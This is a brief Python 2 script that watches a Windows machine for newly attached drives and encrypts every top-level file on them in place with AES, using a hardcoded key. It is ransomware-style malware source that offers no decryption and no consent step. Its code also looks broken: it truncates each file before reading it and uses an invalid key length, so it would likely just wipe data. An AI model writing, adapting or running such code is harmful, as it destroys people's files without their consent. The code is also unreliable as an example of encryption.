#!/usr/bin/python
from ctypes import windll
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Cipher import AES
import hashlib
from Crypto import Random
import string
import time
import os, sys, random


def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.uppercase:
        if bitmask & 1:
        	drives.append(letter)
        bitmask >>= 1
    return drives


def encrypt_file(filename):
	chunksize = 64 * 1024
	outFile = os.path.join(os.path.dirname(filename),os.path.basename(filename))
	filesize = str(os.path.getsize(filename)).zfill(16)
	_AES_key = 'key'
	IV = ''
	for i in range(16):
		IV += chr(random.randint(0, 0xFF))

	encryptor = AES.new(_AES_key, AES.MODE_CBC, IV)

		 
	with open(filename, "rb") as infile:
		with open(outFile, "wb") as outfile:
			outfile.write(filesize)
			outfile.write(IV)
			
			while True:
				chunk = infile.read(chunksize)
				
				if len(chunk) == 0:
					break
				
				elif len(chunk) % 16 !=0:
					chunk += ' ' * (16 - (len(chunk) % 16))
					
				outfile.write(encryptor.encrypt(chunk))


def list_files(path):
    files = []
    for name in os.listdir(path):
        if os.path.isfile(os.path.join(path, name)): 
            files.append(name)
    return files 



if __name__ == '__main__':
	print '[*] Searching usb'
	while True:
		before = set(get_drives())
		time.sleep(5)
		after = set(get_drives())
		drives = after - before
		delta = len(drives)
		if (delta):
			for drive in drives:
				if os.system("cd " + drive + ":") == 0:
					newly_mounted = '%c:\\'%(drive)
					encrypt_files = list_files(newly_mounted)
					for x in encrypt_files:
						if os.path.basename(x).startswith("(encrypted)"):
							print "%s is already encrypted" %str(x)
							pass
						else:
							encrypt_file(os.path.join(newly_mounted, x))
				else:
					print "Sorry, I couldn't find any newly mounted drives."